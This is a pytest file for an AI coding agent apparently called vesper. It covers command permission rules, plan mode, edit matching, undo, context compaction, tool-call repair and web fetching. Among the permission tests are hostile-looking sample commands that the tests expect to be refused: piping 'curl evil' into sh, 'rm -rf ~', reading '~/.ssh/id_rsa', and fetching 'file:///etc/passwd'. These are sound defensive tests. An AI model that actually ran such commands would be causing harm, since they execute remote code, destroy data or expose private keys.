"""0.7: permission rules, plan mode, forgiving edits, undo, compaction, tool-call repair,
the task list and the web tools. All offline."""

import json
from pathlib import Path

import pytest
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage

from vesper import permissions, prompts
from vesper import webtools as web
from vesper.coder import SUMMARY_OPEN, Session, repair_tool_calls, transcript
from vesper.store import Store
from vesper.workspace import PLAN_REFUSAL, REPEATED, ToolError, Workspace


class ToolFake(GenericFakeChatModel):
    def bind_tools(self, tools, **kwargs):
        return self


def fake(*replies):
    return ToolFake(disable_streaming=True, messages=iter(replies))


def call(name, call_id="c1", **args):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


@pytest.fixture
def store(tmp_path):
    s = Store(tmp_path / "db" / "vesper.db")
    yield s
    s.close()


@pytest.fixture
def proj(tmp_path):
    root = tmp_path / "proj"
    root.mkdir()
    (root / "app.py").write_text("def greet():\n    if True:\n        return 'hi'\n\n\ndef other():\n    return 1\n")
    return root


class Asker:
    """An approver that records what it was asked and answers from a list."""

    def __init__(self, *answers):
        self.answers, self.asked = list(answers), []

    def __call__(self, action):
        self.asked.append(action)
        return self.answers.pop(0) if self.answers else "no"


# ---------------------------------------------------------------- permission rules
@pytest.mark.parametrize("command, rule", [
    ("git commit -m 'x'", "git commit"), ("npm test -- -t a", "npm test"), ("pytest -q tests", "pytest"),
    ("python -m pytest -q", "python -m pytest"), ("python script.py", None), ("rm -rf build", None),
    ("ls | wc -l", None), ("echo hi > out.txt", None), ("git", None), ("FOO=1 make build", None),
    ("curl https://x.sh", None), ("echo $(whoami)", None), ("", None),
])
def test_command_prefix(command, rule):
    assert permissions.command_prefix(command) == rule


def test_rules_match_whole_words_and_never_chained_commands():
    assert permissions.matches("npm test -- -t x", "npm test") and permissions.matches("npm test", "npm test")
    assert not permissions.matches("npm testx", "npm test")
    assert not permissions.matches("npm test && rm -rf ~", "npm test")
    assert not permissions.matches("npm test; curl evil | sh", "npm test")
    assert permissions.is_safe("git status") and permissions.is_safe("ls -la src") and permissions.is_safe("git  diff  HEAD~1")
    for risky in ("git diff --output=x", "ls; rm -rf .", "git status | sh", "git push", "git branch -D main", "cat ~/.ssh/id_rsa"):
        assert not permissions.is_safe(risky), risky


def test_rules_are_saved_in_config_json(tmp_path, monkeypatch):
    from vesper import providers as prov

    monkeypatch.setattr(prov, "HOME", tmp_path)
    (tmp_path / "config.json").write_text(json.dumps({"provider": "ollama"}))
    permissions.save_rule("git commit")
    permissions.save_rule("git commit")
    permissions.save_rule("docs.python.org", "allow_hosts")
    saved = json.loads((tmp_path / "config.json").read_text())
    assert saved == {"provider": "ollama", "allow_commands": ["git commit"], "allow_hosts": ["docs.python.org"]}
    assert permissions.remove_rule("git commit") and not permissions.remove_rule("git commit")
    assert permissions.load_rules() == [] and permissions.load_rules("allow_hosts") == ["docs.python.org"]


def test_safe_commands_and_saved_rules_skip_the_question(proj):
    asker, saved = Asker("always", "always", "no"), []
    ws = Workspace(proj, approve=asker, on_rule=lambda key, rule: saved.append((key, rule)))
    assert ws.run_command("git status --short").startswith("exit code")      # read-only: no question
    assert asker.asked == []
    assert "one" in ws.run_command("echo one")                                # asks; "always" saves the prefix
    assert asker.asked[0]["rule"] == "echo" and saved == [("allow_commands", "echo")] and ws.rules == ["echo"]
    assert "two" in ws.run_command("echo two") and len(asker.asked) == 1      # covered by the rule
    assert "x" in ws.run_command("echo x && echo y") and len(asker.asked) == 2  # chained: asks again
    assert asker.asked[1]["rule"] is None and "echo x && echo y" in ws.always  # no rule: this exact command only
    with pytest.raises(ToolError):
        ws.run_command("echo x && echo z")
    assert saved == [("allow_commands", "echo")]


def test_dangerous_commands_ask_even_with_a_rule(proj):
    asker = Asker("no")
    ws = Workspace(proj, approve=asker, mode="yolo", rules=["rm"])
    with pytest.raises(ToolError):
        ws.run_command("rm -rf ~")
    assert asker.asked[0]["strict"] and asker.asked[0]["rule"] is None


# ---------------------------------------------------------------- plan mode
def test_plan_mode_reads_but_changes_nothing(proj):
    ws = Workspace(proj, approve=Asker("yes", "yes"), mode="plan")
    assert "def greet" in ws.read_file("app.py")
    assert ws.run_command("ls").startswith("exit code")
    for attempt in (lambda: ws.write_file("new.txt", "x"), lambda: ws.edit_file("app.py", "return 1", "return 2"),
                    lambda: ws.run_command("touch made.txt")):
        with pytest.raises(ToolError, match="Plan mode"):
            attempt()
    assert not (proj / "new.txt").exists() and not (proj / "made.txt").exists() and "return 1" in (proj / "app.py").read_text()
    assert "Plan mode" in prompts.agent_system_prompt(proj, plan=True) and "Plan mode" not in prompts.agent_system_prompt(proj)
    assert PLAN_REFUSAL.startswith("Plan mode")


def test_session_rebuilds_the_agent_for_plan_mode(proj):
    ws = Workspace(proj, mode="plan")
    s = Session(fake(call("write_file", path="x.txt", content="x"), AIMessage("Here is the plan."), AIMessage("Done.")), ws)
    events = list(s.ask("add a file"))
    refused = next(d for e, d in events if e == "tool_end")
    assert not refused["ok"] and "Plan mode" in refused["output"] and s._agent_key == (proj.resolve(), True)
    ws.mode = "yolo"
    list(s.ask("go"))
    assert s._agent_key == (proj.resolve(), False)


# ---------------------------------------------------------------- forgiving edits
def test_edit_matches_when_only_the_indentation_is_wrong(proj):
    ws = Workspace(proj, mode="yolo")
    out = ws.edit_file("app.py", "if True:\n    return 'hi'", "if True:\n    return 'hello'")
    assert "ignoring indentation" in out
    assert (proj / "app.py").read_text().startswith("def greet():\n    if True:\n        return 'hello'\n\n")


def test_edit_drops_copied_line_numbers_and_removes_extra_indent(proj):
    ws = Workspace(proj, mode="yolo")
    ws.edit_file("app.py", "6\tdef other():\n7\t    return 1", "6\tdef other():\n7\t    return 2")
    assert (proj / "app.py").read_text().endswith("def other():\n    return 2\n")
    ws.edit_file("app.py", "        def other():\n            return 2", "        def other():\n            return 3")
    assert (proj / "app.py").read_text().endswith("def other():\n    return 3\n")


def test_edit_that_cannot_be_placed_says_why(proj):
    ws = Workspace(proj, mode="yolo")
    (proj / "twice.py").write_text("  a = 1\nb\n    a = 1\n")
    with pytest.raises(ToolError, match="matches 2 places"):
        ws.edit_file("twice.py", "a = 1 ", "a = 2")
    with pytest.raises(ToolError, match=r"closest line is 3: \"return 'hi'\""):
        ws.edit_file("app.py", "return 'hi!'", "return 'yo'")
    assert "return 'hi'" in (proj / "app.py").read_text()


def test_forgiving_edit_keeps_windows_line_endings(tmp_path):
    (tmp_path / "w.py").write_bytes(b"def f():\r\n    if x:\r\n        return 1\r\n")
    Workspace(tmp_path, mode="yolo").edit_file("w.py", "if x:\n    return 1", "if x:\n    y = 2\n    return y")
    assert (tmp_path / "w.py").read_bytes() == b"def f():\r\n    if x:\r\n        y = 2\r\n        return y\r\n"


def test_exact_match_wins_over_the_forgiving_one(tmp_path):
    (tmp_path / "t.tsv").write_text("1\tone\n2\ttwo\n")
    Workspace(tmp_path, mode="yolo").edit_file("t.tsv", "2\ttwo", "2\tdeux")
    assert (tmp_path / "t.tsv").read_text() == "1\tone\n2\tdeux\n"


# ---------------------------------------------------------------- repeated calls, tasks
def test_a_repeated_read_costs_a_few_tokens_until_something_changes(proj):
    ws = Workspace(proj, mode="yolo")
    tools = {t.name: t for t in ws.tools()}
    first = tools["read_file"].invoke({"path": "app.py"})
    assert "def greet" in first and tools["read_file"].invoke({"path": "app.py"}) == REPEATED
    assert "def greet" in tools["read_file"].invoke({"path": "app.py", "limit": 2})   # other arguments: a real read
    tools["edit_file"].invoke({"path": "app.py", "old_string": "return 1", "new_string": "return 2"})
    assert "return 2" in tools["read_file"].invoke({"path": "app.py"})                # changed: read again
    assert tools["read_file"].invoke({"path": "missing.py"}).startswith("Error:")
    assert tools["read_file"].invoke({"path": "missing.py"}).startswith("Error:")     # errors are not remembered


def test_task_list_tool(proj):
    seen = []
    ws = Workspace(proj, on_tasks=seen.append)
    out = ws.update_tasks("[x] read the code\n- [>] fix the bug\n3. [ ] run the tests\n\njust a line")
    assert out == "Task list saved (1 of 4 done)."
    assert seen[0] == ws.tasks == [
        {"text": "read the code", "status": "done"}, {"text": "fix the bug", "status": "active"},
        {"text": "run the tests", "status": "pending"}, {"text": "just a line", "status": "pending"}]
    with pytest.raises(ToolError):
        ws.update_tasks("  \n")
    s = Session(fake(call("update_tasks", tasks="[>] one\n[ ] two"), AIMessage("ok")), Workspace(proj))
    events = list(s.ask("plan it"))
    assert ("tasks", {"items": [{"text": "one", "status": "active"}, {"text": "two", "status": "pending"}]}) in events


# ---------------------------------------------------------------- the web tools
PAGE = """<html><head><title>Docs  page</title><style>p{}</style></head><body><nav>menu</nav>
<h1>Install</h1><p>Run <code>pip install x</code> &amp; go.</p><script>alert(1)</script><ul><li>one</li><li>two</li></ul></body></html>"""
RESULTS = """<div><a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fa&amp;rut=1">First <b>hit</b></a>
<a class="result__snippet" href="x">About <b>the</b> first.</a>
<a class="result__a" href="https://example.org/b">Second</a><a class="result__snippet">Second one.</a></div>"""


def test_html_becomes_readable_text():
    text = web.html_to_text(PAGE)
    assert text.startswith("# Install") and "Run pip install x & go." in text   # the page has its own heading
    assert web.html_to_text("<title>Only a title</title><p>Body</p>") == "# Only a title\n\nBody"
    assert "- one\n- two" in text and "alert" not in text and "menu" not in text and "p{}" not in text


def test_fetch_and_search_without_a_network(proj, monkeypatch):
    long_page = "<html><body>" + "<p>word</p>" * 5000 + "</body></html>"
    pages = {"https://example.com/docs": ("text/html", PAGE), "https://example.com/long": ("text/html", long_page),
             "https://example.com/data.json": ("application/json", '{"a": 1}'), "https://example.com/pic": ("image/png", "x")}

    def get(url, headers=None, data=None):
        if url.startswith(web.SEARCH_URL):
            return "text/html", RESULTS
        return pages[url]

    monkeypatch.setattr(web, "_get", get)
    asker = Asker("yes", "always")
    ws = Workspace(proj, approve=asker, on_rule=lambda key, rule: asker.asked.append((key, rule)))
    assert "# Install" in ws.web_fetch("example.com/docs")
    assert asker.asked[0]["kind"] == "web" and asker.asked[0]["host"] == "example.com" and asker.asked[0]["rule"] == "example.com"
    first = ws.web_fetch("https://example.com/long")                       # "always": the host becomes a rule
    assert ("allow_hosts", "example.com") in asker.asked and ws.hosts == ["example.com"]
    assert len(first) < 13_000 and "more characters; call web_fetch with offset=12000" in first
    assert ws.web_fetch("https://example.com/data.json") == '{"a": 1}'     # no further question
    with pytest.raises(ToolError, match="image/png"):
        ws.web_fetch("https://example.com/pic")
    with pytest.raises(ToolError, match="http or https"):
        ws.web_fetch("file:///etc/passwd")
    found = ws.web_search("first hit")
    assert found.startswith("1. First hit\n   https://example.com/a\n   About the first.") and "2. Second\n   https://example.org/b" in found
    with pytest.raises(ToolError):
        Workspace(proj).web_fetch("https://example.com/docs")              # nobody to ask: refused


def test_search_uses_a_key_when_there_is_one_and_never_fights_a_human_check(monkeypatch):
    calls = []

    def get(url, headers=None, data=None):
        calls.append((url, headers or {}, data))
        if url.startswith("https://api.search.brave.com"):
            return "application/json", json.dumps({"web": {"results": [{"title": "<b>Brave</b> hit", "url": "https://b.example", "description": "From Brave."}]}})
        if url == web.TAVILY_URL:
            return "application/json", json.dumps({"results": [{"title": "Tavily hit", "url": "https://t.example", "content": "From  Tavily."}]})
        return "text/html", '<form action="//duckduckgo.com/anomaly.js?x=1"></form>'

    monkeypatch.setattr(web, "_get", get)
    monkeypatch.delenv("BRAVE_API_KEY", raising=False)
    monkeypatch.delenv("TAVILY_API_KEY", raising=False)
    with pytest.raises(web.WebError, match="BRAVE_API_KEY"):
        web.search("anything")
    monkeypatch.setenv("TAVILY_API_KEY", "t-key")
    assert web.search("q") == "1. Tavily hit\n   https://t.example\n   From Tavily."
    assert calls[-1][1]["Authorization"] == "Bearer t-key" and json.loads(calls[-1][2])["query"] == "q"
    monkeypatch.setenv("BRAVE_API_KEY", "b-key")
    assert web.search("two words") == "1. Brave hit\n   https://b.example\n   From Brave."
    assert calls[-1][1]["X-Subscription-Token"] == "b-key" and calls[-1][0].endswith("q=two+words") and "b-key" not in calls[-1][0]


def test_page_text_prefers_the_main_part():
    article = "<p>" + "Real content here. " * 30 + "</p>"
    page = f"<html><body><div><ul><li><a href='/'>Home</a></li><li></li></ul></div><aside>ads</aside><main><h1>Title</h1>{article}</main></body></html>"
    text = web.html_to_text(page)
    assert text.startswith("# Title") and "Home" not in text and "ads" not in text and "Real content here." in text
    assert "Home" in web.html_to_text("<html><body><ul><li>Home</li><li></li></ul><main><p>tiny</p></main></body></html>")


# ---------------------------------------------------------------- tool-call repair
NAMES = {"read_file", "run_command"}


@pytest.mark.parametrize("text", [
    '{"name": "read_file", "arguments": {"path": "a.py"}}',
    '```json\n{"name": "read_file", "parameters": {"path": "a.py"}}\n```',
    '<think>hm</think><tool_call>{"name": "read_file", "arguments": {"path": "a.py"}}</tool_call>',
    "{'name': 'read_file', 'arguments': {'path': 'a.py',}}",
    '{"function": {"name": "read_file", "arguments": "{\\"path\\": \\"a.py\\"}"}}',
])
def test_a_tool_call_written_as_text_becomes_a_real_one(text):
    fixed = repair_tool_calls(AIMessage(text), NAMES)
    assert fixed is not None and fixed.content == ""
    assert fixed.tool_calls[0]["name"] == "read_file" and fixed.tool_calls[0]["args"] == {"path": "a.py"} and fixed.tool_calls[0]["id"]


def test_repair_leaves_ordinary_replies_alone():
    for text in ("Here is the answer.", '{"name": "unknown_tool", "arguments": {}}', '{"total": 3}',
                 'Call it like {"name": "read_file", "arguments": {"path": "a.py"}} to read.'):
        assert repair_tool_calls(AIMessage(text), NAMES) is None
    assert repair_tool_calls(call("read_file", path="a.py"), NAMES) is None
    bad = AIMessage(content="", invalid_tool_calls=[{"name": "run_command", "args": "{'command': 'ls',}", "id": "b1", "error": "x"}])
    assert repair_tool_calls(bad, NAMES).tool_calls[0] == {"name": "run_command", "args": {"command": "ls"}, "id": "b1", "type": "tool_call"}


def test_a_small_model_that_writes_its_calls_as_text_still_works(proj):
    s = Session(fake(AIMessage('{"name": "read_file", "arguments": {"path": "app.py"}}'), AIMessage("It greets.")), Workspace(proj))
    events = list(s.ask("what does app.py do?"))
    done = next(d for e, d in events if e == "tool_end")
    assert done["name"] == "read_file" and done["ok"] and "def greet" in done["output"]
    assert isinstance(s.history[2], ToolMessage) and s.history[-1].content == "It greets."


def test_an_empty_reply_is_asked_for_again(proj):
    s = Session(fake(AIMessage(""), AIMessage("Here you go.")), Workspace(proj))
    assert "Here you go." in "".join(d["text"] for e, d in s.ask("hello") if e == "token")


# ---------------------------------------------------------------- undo
def test_undo_puts_files_back_and_tells_the_model(proj, store):
    before = (proj / "app.py").read_text()
    ws = Workspace(proj, mode="yolo")
    s = Session(fake(call("edit_file", "c1", path="app.py", old_string="return 1", new_string="return 2"),
                     call("edit_file", "c2", path="app.py", old_string="return 2", new_string="return 3"),
                     call("write_file", "c3", path="new/made.txt", content="x\n"), AIMessage("Done."), AIMessage("ok")), ws, store)
    list(s.ask("change things"))
    assert "return 3" in (proj / "app.py").read_text() and (proj / "new" / "made.txt").exists()

    again = Session(fake(AIMessage("ok")), Workspace(proj, mode="yolo"), store, session_id=s.id)  # undo survives a restart
    paths = again.undo()
    assert sorted(paths) == sorted([str((proj / "app.py").resolve()), str((proj / "new" / "made.txt").resolve())])
    assert (proj / "app.py").read_text() == before and not (proj / "new" / "made.txt").exists()
    assert again.undo() == [] and "undo" in [e["kind"] for e in store.events(s.id)]
    list(again.ask("what now?"))
    sent = again.history[-2].content
    assert "<note>The user undid your changes" in sent and "app.py" in sent
    assert transcript(again.history)[-2] == {"role": "user", "text": "what now?"}


def test_undo_goes_back_one_turn_at_a_time_and_keeps_binary_files(proj):
    (proj / "blob.bin").write_bytes(b"\x00\x01\x02")
    ws = Workspace(proj, mode="yolo")
    s = Session(fake(call("write_file", path="blob.bin", content="text now\n"), AIMessage("a"),
                     call("write_file", path="app.py", content="gone\n"), AIMessage("b")), ws)
    original = (proj / "app.py").read_text()
    list(s.ask("one"))
    list(s.ask("two"))
    assert [Path(p).name for p in s.undo()] == ["app.py"] and (proj / "app.py").read_text() == original
    assert (proj / "blob.bin").read_text() == "text now\n"
    assert [Path(p).name for p in s.undo()] == ["blob.bin"] and (proj / "blob.bin").read_bytes() == b"\x00\x01\x02"
    assert s.undo() == []


# ---------------------------------------------------------------- compaction
def long_history(turns=5):
    out = []
    for i in range(turns):
        out += [HumanMessage(f"question {i}"), call("read_file", f"c{i}", path=f"f{i}.py"),
                ToolMessage("x" * 4000, tool_call_id=f"c{i}", name="read_file"), AIMessage(f"answer {i}")]
    return out


def test_compact_replaces_older_turns_with_a_summary(proj, store):
    s = Session(fake(AIMessage("- the user is fixing f0.py\n- tests pass")), Workspace(proj), store)
    s._ensure_saved("start")
    s.history = long_history()
    assert s.compact()
    assert s.history[0].content.startswith(SUMMARY_OPEN) and "fixing f0.py" in s.history[0].content
    assert [m.content for m in s.history if isinstance(m, HumanMessage)][1:] == ["question 3", "question 4"]
    turns = transcript(s.history)
    assert turns[0]["role"] == "assistant" and "Summary of the earlier conversation" in turns[0]["parts"][0]["text"]
    assert turns[1] == {"role": "user", "text": "question 3"}
    assert len(store.load_messages(s.id)) == len(s.history) and "compact" in [e["kind"] for e in store.events(s.id)]
    assert not Session(fake(), Workspace(proj)).compact()                       # nothing to summarize


def test_a_long_conversation_is_summarized_before_the_next_turn(proj):
    s = Session(fake(AIMessage("- notes"), AIMessage("next answer")), Workspace(proj), context_tokens=2000)
    s.history = long_history()
    events = list(s.ask("and now?"))
    assert any(e == "notice" and "summarized" in d["text"] for e, d in events)
    assert s.history[0].content.startswith(SUMMARY_OPEN) and s.history[-1].content == "next answer"


def test_a_long_turn_is_trimmed_while_it_runs(proj):
    for n in range(6):
        (proj / f"big{n}.txt").write_text("line of text\n" * 380)
    replies = [call("read_file", f"r{n}", path=f"big{n}.txt") for n in range(6)] + [AIMessage("read them all")]
    seen = []

    class Watching(ToolFake):
        def _generate(self, messages, *args, **kwargs):
            seen.append(sum(len(str(m.content)) for m in messages))
            return super()._generate(messages, *args, **kwargs)

    s = Session(Watching(disable_streaming=True, messages=iter(replies)), Workspace(proj), context_tokens=5000)
    list(s.ask("read the big files"))
    assert max(seen) < s._budget() + 6000 and s.history[-1].content == "read them all"


# ---------------------------------------------------------------- store, usage, providers
def test_checkpoints_keep_the_first_copy_of_a_turn(store):
    sid = store.create_session("/tmp")
    store.add_checkpoint(sid, 1, "/a", b"one")
    store.add_checkpoint(sid, 1, "/a", b"two")
    store.add_checkpoint(sid, 2, "/b", None)
    assert store.checkpoints(sid) == [(2, "/b", None)]
    store.delete_checkpoints(sid, 2)
    assert store.checkpoints(sid) == [(1, "/a", b"one")]
    store.delete_session(sid)
    assert store.checkpoints(sid) == []


def test_usage_reports_cached_tokens(proj):
    reply = AIMessage("ok", usage_metadata={"input_tokens": 1000, "output_tokens": 5, "total_tokens": 1005,
                                            "input_token_details": {"cache_read": 900}})
    usage = next(d for e, d in Session(fake(reply), Workspace(proj)).ask("hi") if e == "usage")
    assert usage["cached"] == 900 and usage["input"] == 1000


def test_thinking_settings_reach_each_provider(monkeypatch):
    from vesper import providers as prov

    monkeypatch.setenv("ANTHROPIC_API_KEY", "k")
    monkeypatch.setenv("OPENAI_API_KEY", "k")
    plain = prov.get_llm("anthropic", "claude-sonnet-5-5")
    assert plain.thinking is None and plain.temperature is None             # current Claude models refuse a temperature
    claude = prov.get_llm("anthropic", "claude-sonnet-5-5", thinking="high")
    payload = claude._get_request_payload([("human", "hi")])
    assert payload["thinking"] == {"type": "adaptive", "display": "summarized"} and payload["output_config"] == {"effort": "high"}
    assert prov.get_llm("anthropic", "claude-haiku-4-5", thinking="low").thinking == {"type": "enabled", "budget_tokens": 4096}
    assert prov.get_llm("openai", "o4-mini", thinking="low").reasoning_effort == "low"
    assert prov.get_llm("openai", "gpt-4.1-mini").reasoning_effort is None
    assert prov.get_llm("ollama", "qwen3", thinking="medium").reasoning is True
    assert [type(m).__name__ for m in prov.agent_middleware(claude)] == ["AnthropicPromptCachingMiddleware"]
    assert prov.agent_middleware(prov.get_llm("openai", "gpt-4.1-mini")) == []


def test_the_fixed_part_of_the_prompt_comes_first(proj, tmp_path):
    other = tmp_path / "other"
    other.mkdir()
    a, b = prompts.agent_system_prompt(proj), prompts.agent_system_prompt(other)
    shared = len(a) - len(a.split("# Environment")[1]) - len("# Environment")
    assert a[:shared] == b[:shared] and shared > 2500 and str(proj) not in a[:shared]
    for tool in ("update_tasks", "web_search", "web_fetch", "edit_file", "change_directory"):
        assert tool in a


# ---------------------------------------------------------------- the terminal app
@pytest.fixture
def app(proj, store, monkeypatch, tmp_path):
    from vesper import providers as prov
    from vesper import tui

    monkeypatch.setattr(prov, "HOME", tmp_path / "home")
    monkeypatch.setenv("VESPER_FAKE_LLM", "1")
    monkeypatch.setattr(tui, "save_config", lambda patch: None)
    a = tui.App(proj, "yolo", {}, store)
    a.build()
    return a


def test_terminal_undo_plan_compact_permissions_think(app, proj, capsys, monkeypatch):
    app.command("/undo")
    assert "Nothing to undo" in capsys.readouterr().out
    app.run_turn("make notes", shown="make notes")
    assert (proj / "vesper-notes.md").exists() and app._finished
    app.command("/undo")
    assert not (proj / "vesper-notes.md").exists() and "1 file put back" in capsys.readouterr().out

    app.command("/plan")
    assert app.mode == "plan" and app.workspace.mode == "plan"
    app.run_turn("make notes again")
    assert not (proj / "vesper-notes.md").exists() and "Plan mode" in capsys.readouterr().out
    monkeypatch.setattr("builtins.input", lambda *a: "y")
    assert app.offer_plan() and app.mode == "yolo"
    app.command("/plan")
    monkeypatch.setattr("builtins.input", lambda *a: "")
    assert not app.offer_plan() and app.mode == "plan"
    app.command("/plan")
    assert app.mode == "yolo"

    app.workspace._remember("run", "git commit -m x", "git commit")
    app.workspace._remember("web", "", "example.com")
    assert permissions.load_rules() == ["git commit"] and permissions.load_rules("allow_hosts") == ["example.com"]
    app.command("/permissions")
    out = capsys.readouterr().out
    assert "git commit" in out and "example.com" in out and "git status" in out
    app.command("/permissions remove 1")
    assert app.workspace.rules == [] and permissions.load_rules() == [] and app.workspace.hosts == ["example.com"]
    app.command("/permissions remove 9")

    app.command("/compact")
    app.command("/think high")
    assert app.cfg["thinking"] == "high"
    app.command("/think")
    app.command("/status")
    out = capsys.readouterr().out
    assert "thinking: high" in out and "summar" in out.lower()


def test_terminal_draws_the_task_list(app, capsys):
    app.draw("tasks", {"items": [{"text": "read", "status": "done"}, {"text": "fix", "status": "active"}, {"text": "test", "status": "pending"}]})
    app.draw("tool_start", {"id": "t", "name": "update_tasks", "args": {"tasks": "x"}})
    app.draw("tool_end", {"id": "t", "name": "update_tasks", "output": "Task list saved", "ok": True, "ms": 1})
    app.renderer.stop()
    out = capsys.readouterr().out
    assert "✔ read" in out and "▸ fix" in out and "☐ test" in out and "Task list saved" not in out


# ---------------------------------------------------------------- the desktop engine
def test_engine_undo_compact_and_permissions_api(server, make_client, tmp_path, monkeypatch):
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "a.txt").write_text("alpha\n")
    engine = server.Engine()
    engine.update({"mode": "folder", "workspace": str(proj), "agent_mode": "yolo", "thinking": "low"})
    assert engine.settings["thinking"] == "low"
    llm = fake(call("edit_file", path="a.txt", old_string="alpha", new_string="beta"), AIMessage("Changed."),
               AIMessage("- summary"), AIMessage("More."))
    monkeypatch.setattr(engine, "llm", lambda: llm)
    list(engine.stream_answer("change it", "chat-1", []))
    assert (proj / "a.txt").read_text() == "beta\n"

    client = make_client(engine=engine)
    assert client.post("/api/chats/chat-1/undo", json={}).json() == {"paths": [str((proj / "a.txt").resolve())]}
    assert (proj / "a.txt").read_text() == "alpha\n"
    assert client.post("/api/chats/chat-1/undo", json={}).json() == {"paths": []}
    assert client.post("/api/chats/bad%20id/undo", json={}).status_code == 400
    assert client.post("/api/chats/chat-1/undo", json={"session_id": "../x"}).status_code == 400

    done = client.post("/api/chats/chat-1/compact", json={}).json()
    assert done["compacted"] is True and engine._sessions["chat-1"]["session"].history[0].content.startswith(SUMMARY_OPEN)

    permissions.save_rule("npm test")
    permissions.save_rule("example.com", "allow_hosts")
    listed = client.get("/api/permissions").json()
    assert listed["commands"] == ["npm test"] and listed["hosts"] == ["example.com"] and "git status" in listed["safe"]
    assert client.post("/api/permissions/remove", json={"kind": "commands", "rule": "npm test"}).json()["commands"] == []
    assert client.post("/api/permissions/remove", json={"kind": "nope", "rule": "x"}).status_code == 400
    assert client.post("/api/settings", json={"agent_mode": "plan"}).json()["settings"]["agent_mode"] == "plan"
    assert client.post("/api/settings", json={"thinking": "max"}).status_code == 400
    assert client.post("/api/chats/chat-1/undo", json={}, headers={"X-Token": "wrong"}).status_code in (401, 403)
